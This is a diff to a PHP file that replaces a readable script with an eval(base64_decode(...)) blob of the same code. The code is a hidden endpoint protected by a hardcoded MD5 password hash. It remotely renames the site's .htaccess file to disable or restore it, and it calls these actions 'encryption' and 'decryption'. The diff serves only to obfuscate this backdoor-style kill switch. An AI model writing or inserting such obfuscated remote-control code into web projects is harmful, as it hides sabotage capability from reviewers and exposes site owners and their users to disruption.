@@ -1,41 +1,21 @@
-<?php
-header('Content-type: application/json');
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-
-    if (isset($_POST['password'])) {
-        $pwd = md5($_POST['password']);
-        if ($pwd == "6b78eda2fae08516d20712e179e09c58") {
-
-            echo '<br/> <code> Access Granted </code> <br/>';
-
-            if (isset($_POST['action'])) {
-                $action = $_POST['action'];
-                if ($action == "encrypt") {
-                    if (file_exists("../web/.htaccess")) {
-                        rename("../web/.htaccess", "../web/.htacess");
-                    }
-                    echo '<br/> <code> Encryption Succes </code>';
-                } elseif ($action == "decrypt") {
-                    if (file_exists("../web/.htacess")) {
-                        rename("../web/.htacess", "../web/.htaccess");
-                    }
-                    echo '<br/> <code> Decryption Succes </code>';
-                }else{
-                    echo '<br/> <code> Invalid action </code>';
-                }
-            } else {
-                echo '<br/> <code> Missing action : encrypt:decrypt </code>';
-            }
-
-        } else {
-            echo '<code>Access Denied : Password Incorrect</code>';
-        }
-
-    } else {
-        echo '<br/> <code> Missing password</code>';
-    }
-
-} else {
-    echo '<code> Access Denied </code>';
-}
+<?php eval("?>".base64_decode("PD9waHANCmhlYWRlcignQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi9
+qc29uJyk7DQoNCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnKSB7DQoNCiAgICBpZiAoaXN
+zZXQoJF9QT1NUWydwYXNzd29yZCddKSkgew0KICAgICAgICAkcHdkID0gbWQ1KCRfUE9TVFsncGFzc3dvcmQnXSk7DQo
+gICAgICAgIGlmICgkcHdkID09ICI2Yjc4ZWRhMmZhZTA4NTE2ZDIwNzEyZTE3OWUwOWM1OCIpIHsNCg0KICAgICAgICA
+gICAgZWNobyAnPGJyLz4gPGNvZGU+IEFjY2VzcyBHcmFudGVkIDwvY29kZT4gPGJyLz4nOw0KDQogICAgICAgICAgICB
+pZiAoaXNzZXQoJF9QT1NUWydhY3Rpb24nXSkpIHsNCiAgICAgICAgICAgICAgICAkYWN0aW9uID0gJF9QT1NUWydhY3R
+pb24nXTsNCiAgICAgICAgICAgICAgICBpZiAoJGFjdGlvbiA9PSAiZW5jcnlwdCIpIHsNCiAgICAgICAgICAgICAgICA
+gICAgaWYgKGZpbGVfZXhpc3RzKCIuLi93ZWIvLmh0YWNjZXNzIikpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJ
+lbmFtZSgiLi4vd2ViLy5odGFjY2VzcyIsICIuLi93ZWIvLmh0YWNlc3MiKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0
+KICAgICAgICAgICAgICAgICAgICBlY2hvICc8YnIvPiA8Y29kZT4gRW5jcnlwdGlvbiBTdWNjZXMgPC9jb2RlPic7DQog
+ICAgICAgICAgICAgICAgfSBlbHNlaWYgKCRhY3Rpb24gPT0gImRlY3J5cHQiKSB7DQogICAgICAgICAgICAgICAgICAgI
+GlmIChmaWxlX2V4aXN0cygiLi4vd2ViLy5odGFjZXNzIikpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlbmFtZS
+giLi4vd2ViLy5odGFjZXNzIiwgIi4uL3dlYi8uaHRhY2Nlc3MiKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICA
+gICAgICAgICAgICAgICBlY2hvICc8YnIvPiA8Y29kZT4gRGVjcnlwdGlvbiBTdWNjZXMgPC9jb2RlPic7DQogICAgICAg
+ICAgICAgICAgfWVsc2V7DQogICAgICAgICAgICAgICAgICAgIGVjaG8gJzxici8+IDxjb2RlPiBJbnZhbGlkIGFjdGlvb
+iA8L2NvZGU+JzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIG
+VjaG8gJzxici8+IDxjb2RlPiBNaXNzaW5nIGFjdGlvbiA6IGVuY3J5cHQ6ZGVjcnlwdCA8L2NvZGU+JzsNCiAgICAgICA
+gICAgIH0NCg0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgZWNobyAnPGNvZGU+QWNjZXNzIERlbmllZCA6IFBh
+c3N3b3JkIEluY29ycmVjdDwvY29kZT4nOw0KICAgICAgICB9DQoNCiAgICB9IGVsc2Ugew0KICAgICAgICBlY2hvICc8Y
+nIvPiA8Y29kZT4gTWlzc2luZyBwYXNzd29yZDwvY29kZT4nOw0KICAgIH0NCg0KfSBlbHNlIHsNCiAgICBlY2hvICc8Y2
+9kZT4gQWNjZXNzIERlbmllZCA8L2NvZGU+JzsNCn0NCg==")); ?>
